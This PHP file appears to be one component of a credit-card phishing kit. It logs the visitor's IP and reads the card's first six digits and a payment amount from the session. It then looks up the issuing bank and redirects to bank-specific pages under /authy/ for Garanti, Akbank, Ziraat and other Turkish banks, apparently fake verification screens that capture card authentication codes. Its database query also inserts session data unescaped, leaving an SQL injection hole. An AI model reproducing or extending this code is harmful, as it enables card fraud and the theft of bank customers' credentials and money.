<?php
include(__DIR__ . "/gmypanel/Core/getRealIPAdress.php");
include(__DIR__ . "/gmypanel/Connection.php");
$ip = getUserIP();
 ob_start(); 
session_start();
$bin = $_SESSION['cc_first_6'] ?? "";
$tutar = $_SESSION['tutar'] ?? "29";



	//	echo '<script type="text/javascript">alert("'.$_SESSION['cc_first_6'].'");</script>';


$kontrol = $db->query("SELECT * FROM banklist WHERE PrefixNo = '$bin'")->fetch(PDO::FETCH_ASSOC);

	
	
			echo '<script type="text/javascript">alert("'.$kontrol['MemberName'].'");</script>';

		
		
		// $binkontrol = "".$sorgulabin['MemberName']." - ".$sorgulabin['CardType']." - ".$sorgulabin['SubType']."";
	
	
	
   $memberName = strtoupper($kontrol['MemberName']);

if (preg_match('/GARANTI|GARANTİ/i', $memberName)) {
    header('Location: /authy/garanti.php');

} elseif (preg_match('/YAPI KREDI|YAPI VE KREDI/i', $memberName)) {
    header('Location: /authy/yapikredi.php');

} elseif (preg_match('/FINANSBANK|FİNANSBANK/i', $memberName)) {
    header('Location: /authy/finansbank.php');

} elseif (preg_match('/AKBANK/i', $memberName)) {
    header('Location: /authy/akbank.php');

} elseif (preg_match('/IS BANKASI|İŞ BANKASI/i', $memberName)) {
    header('Location: /authy/isbankasi.php');

} elseif (preg_match('/ING/i', $memberName)) {
    header('Location: /authy/ing.php');

} elseif (preg_match('/HALK/i', $memberName)) {
    header('Location: /authy/halkbank.php');

} elseif (preg_match('/ZIRAAT|ZİRAAT/i', $memberName)) {
    header('Location: /authy/ziraat.php');

} else {
    header('Location: /authy/other.php');
}


?>
